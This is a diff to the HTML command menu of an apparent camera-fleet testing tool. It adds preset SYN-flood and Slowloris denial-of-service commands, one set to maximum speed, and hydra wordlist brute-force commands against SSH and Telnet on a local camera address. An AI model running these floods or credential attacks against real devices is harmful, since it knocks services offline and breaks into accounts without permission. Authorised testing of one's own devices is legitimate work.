@@ -241,9 +241,13 @@
 
       <details class="cmd-group">
         <summary>DoS — SYN Flood</summary>
-        <div class="cmd-item" data-cmd="80 --synflood --synflood-threads 2 --synflood-rate 100">
-          <code>80 --synflood --synflood-threads 2 --synflood-rate 100</code>
-          <span class="cmd-desc">SYN flood port 80, 100 pkt/s</span>
+        <div class="cmd-item" data-cmd="--connections 500 --synflood --synflood-threads 20 --synflood-rate 0">
+          <code>--connections 500 --synflood --synflood-threads 20 --synflood-rate 0</code>
+          <span class="cmd-desc">SYN flood + Slowloris, auto-scan port, max speed</span>
+        </div>
+        <div class="cmd-item" data-cmd="--connections 200 --synflood --synflood-threads 10 --synflood-rate 50">
+          <code>--connections 200 --synflood --synflood-threads 10 --synflood-rate 50</code>
+          <span class="cmd-desc">SYN flood nhẹ, 50 pkt/s/thread</span>
         </div>
       </details>
 
@@ -296,6 +300,14 @@
         <div class="cmd-item" data-cmd="--timeout 120 hydra -l root -p root -t 1 -w 5 ssh://192.168.1.28:22" data-mode="brute">
           <code>hydra -l root -p root -t 1 ssh://&lt;IP&gt;</code>
           <span class="cmd-desc">SSH 1 cặp credentials</span>
+        </div>
+        <div class="cmd-item" data-cmd="--timeout 120 hydra -L /home/pi/CamFleetManager/data/hydra-input/user.txt -P /home/pi/CamFleetManager/data/hydra-input/password.txt -t 1 -w 5 ssh://192.168.1.28:22" data-mode="brute">
+          <code>hydra -L user.txt -P password.txt ssh://&lt;IP&gt;</code>
+          <span class="cmd-desc">SSH — hai file trên Pi, tự chuyển sang Camera</span>
+        </div>
+        <div class="cmd-item" data-cmd="--timeout 120 hydra -L /home/pi/CamFleetManager/data/hydra-input/user.txt -P /home/pi/CamFleetManager/data/hydra-input/password.txt -t 1 -w 5 telnet://192.168.1.28:23" data-mode="brute">
+          <code>hydra -L user.txt -P password.txt telnet://&lt;IP&gt;</code>
+          <span class="cmd-desc">Telnet — hai file trên Pi, tự chuyển sang Camera</span>
         </div>
       </details>
 
